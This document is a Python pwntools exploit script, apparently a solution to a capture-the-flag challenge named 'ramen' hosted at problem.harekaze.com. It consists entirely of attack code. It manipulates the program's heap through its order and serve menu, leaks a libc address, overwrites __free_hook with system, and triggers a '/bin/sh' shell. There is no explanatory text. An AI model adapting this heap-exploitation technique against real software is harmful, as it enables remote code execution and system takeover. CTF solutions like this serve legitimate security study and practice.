#!/usr/bin/env python
from pwn import *

def order(toppings='A', eggs=0, porks=0, bamboo_shoots=0, flavor=1):
    s.sendlineafter('Choice: ', '1')
    s.sendlineafter('Choice: ', str(flavor))
    s.sendlineafter('eggs? ', str(eggs))
    s.sendlineafter('pork? ', str(porks))
    s.sendlineafter('shoots? ', str(bamboo_shoots))
    s.sendafter('down: ', toppings)

def serve():
    s.sendlineafter('Choice: ', '2')
    s.recvuntil('Serving ')
    name = s.recvuntil(' ')[:-1]
    s.recvuntil('Eggs: ')
    eggs = int(s.recvline(False))
    s.recvuntil('pork: ')
    porks = int(s.recvline(False))
    s.recvuntil('shoots: ')
    bamboo_shoots = int(s.recvline(False))
    s.recvuntil('toppings: ')
    toppings = s.recvline(False)
    return name, eggs, porks, bamboo_shoots, toppings

def change(num):
    s.sendlineafter('Choice: ', '3')
    s.sendlineafter('seats: ', str(num))

if len(sys.argv) == 1:
    s = process('./ramen')
else:
    s = remote('problem.harekaze.com', 20004)

libc = ELF('./libc.so.6')

change(0x1f)
for i in range(6):
    order()
change(7)
order()
serve()
order()
serve()
order('A', 0, 0x4b1)
change(7)
for i in range(5):
    serve()
change(3)
serve()
libc_base = u64(serve()[0].ljust(8, '\0')) - 0x3ebca0
log.info('libc base: %#x' % libc_base)

change(7)
for i in range(0xd):
    order()
    serve()
order()
change(7)
for i in range(3):
    serve()
change(0xf)
order(p64(libc_base + libc.symbols['__free_hook']))
order('/bin/sh\0')
order(p64(libc_base + libc.symbols['system']))
serve()
s.interactive()
